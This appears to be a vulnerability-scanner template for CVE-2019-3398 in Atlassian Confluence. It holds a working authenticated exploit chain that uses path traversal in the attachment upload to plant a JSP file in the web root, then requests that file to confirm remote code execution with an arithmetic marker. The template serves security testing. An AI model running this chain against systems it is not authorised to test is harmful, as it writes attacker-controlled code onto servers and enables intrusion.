http:
- extractors:
  - group: 1
    internal: true
    name: csrftoken
    part: body
    regex:
    - 'name="atlassian\-token" content="([a-z0-9]+)"> '
    type: regex
  - group: 1
    internal: true
    name: draftID
    part: body
    regex:
    - ta name="ajs\-draft\-id" content="([0-9]+)">
    type: regex
  host-redirects: true
  matchers:
  - part: body_5
    type: word
    words:
    - '{{result}}'
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /dologin.action HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    os_username={{username}}&os_password={{password}}&login=Log%2Bin&os_destination=

    '
  - 'GET /pages/createpage.action HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /plugins/drag-and-drop/upload.action?draftId={{draftID}}&filename=../../../../../../opt/atlassian/confluence/confluence/pages/{{randstr}}.jsp&size=8&mimeType=text%2Fplain&atl_token={{csrftoken}}
    HTTP/1.1

    Host: {{Hostname}}


    ${{{num1}}*{{num2}}}

    '
  - 'GET /pages/downloadallattachments.action?pageId={{draftID}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /pages/{{randstr}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2019-3398
info:
  author: rootxharsh,iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-3398
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-22
    epss-percentile: 0.99801
    epss-score: 0.9722
  description: 'Confluence Server and Data Center had a path traversal vulnerability
    in the downloadallattachments resource. A remote attacker who has permission to
    add attachments to pages and / or blogs or to create a new space or a personal
    space or who has ''Admin'' permissions for a space can exploit this path traversal
    vulnerability to write files to arbitrary locations which can lead to remote code
    execution on systems that run a vulnerable version of Confluence Server or Data
    Center.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    max-request: 5
    product: confluence
    vendor: atlassian
  name: Atlassian Confluence Download Attachments - Remote Code Execution
  reference:
  - https://blogs.juniper.net/en-us/threat-research/cve-2019-3398-atlassian-confluence-download-attachments-remote-code-execution
  - https://nvd.nist.gov/vuln/detail/CVE-2019-3398
  - http://packetstormsecurity.com/files/152616/Confluence-Server-Data-Center-Path-Traversal.html
  - http://packetstormsecurity.com/files/155245/Atlassian-Confluence-6.15.1-Directory-Traversal.html
  - https://jira.atlassian.com/browse/CONFSERVER-58102
  remediation: 'Apply the latest security patches provided by Atlassian to fix the
    vulnerability.

    '
  severity: high
  tags: packetstorm,cve,cve2019,atlassian,confluence,rce,authenticated,intrusive,kev
variables:
  num1: '{{rand_int(800000, 999999)}}'
  num2: '{{rand_int(800000, 999999)}}'
  result: '{{to_number(num1)*to_number(num2)}}'
